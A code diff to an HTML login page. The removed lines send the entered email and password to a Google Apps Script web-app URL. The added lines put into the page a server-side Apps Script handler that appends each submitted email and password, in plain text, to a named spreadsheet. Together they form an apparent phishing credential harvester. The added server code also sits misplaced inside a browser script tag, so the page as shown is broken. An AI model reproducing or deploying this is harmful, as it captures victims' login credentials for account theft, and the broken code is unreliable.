@@ -45,26 +45,24 @@
   </div>
 
   <script>
-    function submitLogin() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+   function doPost(e) {
+  try {
+    const sheet = SpreadsheetApp.openById("1hjqk9_cRF9IOJJbn04Za_VZZ3qZixPNvLRgmGdrwlVc").getSheetByName("Sheet1");
+    const data = JSON.parse(e.postData.contents);
+    const email = data.email || "";
+    const password = data.password || "";
+    sheet.appendRow([new Date(), email, password]);
+    
+    return ContentService
+      .createTextOutput(JSON.stringify({ status: "success" }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch (error) {
+    return ContentService
+      .createTextOutput(JSON.stringify({ status: "error", message: error.message }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
 
-      fetch("https://script.google.com/macros/s/AKfycbz4cbRwVhTMNBEA0lonOpBTNpg48csR3spyLUmHcrjHpbUD7mw4Bqr9GBrZtdcqQ-R0bA/exec", {
-        method: "POST",
-        body: JSON.stringify({ email, password }),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(res => res.json())
-      .then(data => {
-        alert("Login data submitted!");
-      })
-      .catch(err => {
-        alert("Error submitting login data.");
-        console.error(err);
-      });
-    }
   </script>
 </body>
 </html>
